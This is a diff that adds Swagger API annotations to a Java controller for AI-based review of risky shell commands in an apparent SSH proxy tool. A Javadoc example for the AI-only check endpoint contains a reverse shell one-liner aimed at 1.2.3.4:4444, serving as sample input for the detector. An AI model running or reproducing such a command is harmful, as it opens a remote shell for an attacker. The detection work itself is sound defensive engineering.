@@ -7,6 +7,8 @@ import com.zhanghan.sshproxyproject.entity.*;
 import com.zhanghan.sshproxyproject.mapper.AuditLogMapper;
 import com.zhanghan.sshproxyproject.service.DeepSeekService;
 import com.zhanghan.sshproxyproject.service.RecommendationService;
+import io.swagger.v3.oas.annotations.Operation;
+import io.swagger.v3.oas.annotations.tags.Tag;
 import jakarta.annotation.Resource;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.web.bind.annotation.*;
@@ -18,6 +20,7 @@ import java.util.*;
  * <p>
  * 提供命令审查、危险排名、策略推荐等 REST 接口
  */
+@Tag(name = "AI 风险分析", description = "命令审查 / 危险排名 / 策略推荐")
 @RestController
 @Slf4j
 @RequestMapping("/ai")
@@ -46,6 +49,7 @@ public class AIRiskController {
      *
      * 静态规则引擎使用正则匹配（非旧版子串匹配），AI 审查同步执行。
      */
+    @Operation(summary = "命令风险分析", description = "静态规则 + AI 审查综合判定")
     @PostMapping("/analyze")
     public Result analyzeCommand(@RequestBody Map<String, String> body) {
         String command = body.get("command");
@@ -117,6 +121,7 @@ public class AIRiskController {
     /**
      * 危险命令用户排行榜
      */
+    @Operation(summary = "危险命令用户排行榜")
     @GetMapping("/ranking")
     public Result getRanking() {
         List<Map<String, Object>> ranking = auditLogMapper.getDangerRanking();
@@ -143,6 +148,7 @@ public class AIRiskController {
      * 建议由 {@code RecommendationTask} 每天 0 点异步生成并缓存，
      * 此处直接返回缓存内容，避免每次请求都调用 AI。
      */
+    @Operation(summary = "AI 策略推荐", description = "返回定时任务生成的安全策略建议缓存")
     @GetMapping("/recommendations")
     public Result getRecommendations() {
         return Result.ok(recommendationService.getRecommendations());
@@ -156,6 +162,7 @@ public class AIRiskController {
      * Body: { "command": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" }
      * </pre>
      */
+    @Operation(summary = "单独测试 AI 审查", description = "不做静态规则判定，纯看 AI 判断")
     @PostMapping("/check")
     public Result checkByAiOnly(@RequestBody Map<String, String> body) {
         String command = body.get("command");
